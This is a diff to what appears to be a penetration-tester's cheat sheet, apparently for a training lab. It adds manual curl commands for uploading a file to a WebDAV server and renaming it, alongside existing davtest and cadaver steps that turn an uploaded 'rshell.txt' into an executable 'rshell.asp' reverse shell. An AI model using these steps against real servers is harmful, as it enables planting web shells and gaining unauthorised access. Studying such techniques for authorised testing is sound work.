@@ -30,7 +30,7 @@ MSRPC (135)
 ColdFusion vulns
 * https://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers
 
-WEBDAV vulns
+WEBDAV vulns - using tools
 ```bash
 $ davtest -url 10.11..113                                 # test for webdav vulns
 $ davtest -url http://10.11.1.13                          # upload file from local to remote dir (HTTP PUT)
@@ -38,6 +38,12 @@ $ davtest -url http://10.11.1.13                          # upload file from loc
 $ cadaver
 dav:!> open 10.11.1.13                                    # open connection to URL
 dav:!> move '/rshell.txt' to '/rshell.asp'                # move .txt -> .asp (now executable)
+```
+
+WEBDAV vulns - manual
+```bash
+$ curl -T '/path/to/local/file.txt' 'http://10.11.1.13/'                              # upload file to remote
+$ curl -v -X MOVE -H 'Destination: http://10.11.1.13/[new]' 'http://10.11.1.13/[old]' # move .ext1 -> .ext2
 ```
 
 ## Reverse Shell Tips
